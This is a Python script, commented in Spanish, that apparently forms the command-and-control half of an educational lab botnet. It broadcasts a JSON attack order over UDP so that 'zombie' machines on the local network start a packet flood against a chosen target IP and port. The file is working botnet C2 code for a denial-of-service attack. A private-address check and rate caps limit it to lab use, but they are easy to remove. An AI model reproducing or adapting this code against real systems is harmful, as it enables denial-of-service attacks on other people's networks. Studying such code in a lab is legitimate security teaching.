#!/usr/bin/env python3
"""
commander.py - C2 (Command & Control) de la botnet de laboratorio.

Envia por UDP BROADCAST una orden de ataque que los zombis escuchan. No necesita
conocer las IPs de los zombis: se apoya en el broadcast de la red local, igual que
muchas botnets reales usan canales de descubrimiento en la LAN.

Uso:
    python commander.py --target 192.168.1.50 --port 9999 --duration 10
    python commander.py -t 10.0.0.5 -p 5005 -d 15 --pps 3000 --size 1024

El objetivo debe estar en un rango privado/loopback (guardarrail del PoC).
"""

import argparse
import json
import socket
import sys

from common import (
    CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target, clamp,
    MAX_DURATION, MAX_PPS, MAX_SIZE,
)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="C2 de la botnet de laboratorio (PoC educativo).")
    p.add_argument("-t", "--target", required=True, help="IP de la victima (debe ser privada/loopback)")
    p.add_argument("-p", "--port", type=int, required=True, help="Puerto UDP de la victima")
    p.add_argument("-d", "--duration", type=int, default=10, help="Duracion del ataque en segundos (def. 10)")
    p.add_argument("--pps", type=int, default=2000, help="Paquetes/seg objetivo por zombi (def. 2000)")
    p.add_argument("--size", type=int, default=512, help="Tamano del payload en bytes (def. 512)")
    p.add_argument("--broadcast", default="255.255.255.255",
                   help="Direccion de broadcast (def. 255.255.255.255; usa la de tu subred, p.ej. 192.168.1.255)")
    p.add_argument("--control-port", type=int, default=CONTROL_PORT,
                   help=f"Puerto de control donde escuchan los zombis (def. {CONTROL_PORT})")
    return p


def main() -> int:
    args = build_parser().parse_args()

    if not is_lab_target(args.target):
        print(f"[!] Objetivo rechazado: {args.target} no es una IPv4 privada/loopback.")
        print("    Este PoC solo opera dentro de la red del laboratorio.")
        return 1

    if not (0 < args.port < 65536):
        print(f"[!] Puerto invalido: {args.port}")
        return 1

    # Acotamos los parametros a los topes de seguridad de la simulacion.
    duration = clamp(args.duration, 1, MAX_DURATION)
    pps = clamp(args.pps, 1, MAX_PPS)
    size = clamp(args.size, 1, MAX_SIZE)

    order = {
        "cmd": "attack",
        "target_ip": args.target,
        "target_port": args.port,
        "duration": duration,
        "pps": pps,
        "size": size,
        "token": CAMPAIGN_TOKEN,
    }
    payload = json.dumps(order).encode("utf-8")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        sock.sendto(payload, (args.broadcast, args.control_port))
    finally:
        sock.close()

    print("[*] Orden de ataque enviada por broadcast:")
    print(f"      broadcast  -> {args.broadcast}:{args.control_port}")
    print(f"      victima    -> {args.target}:{args.port}")
    print(f"      duracion   -> {duration}s   pps/zombi -> {pps}   size -> {size}B")
    print("[*] Todos los zombis que escuchen en la LAN comenzaran el ataque.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
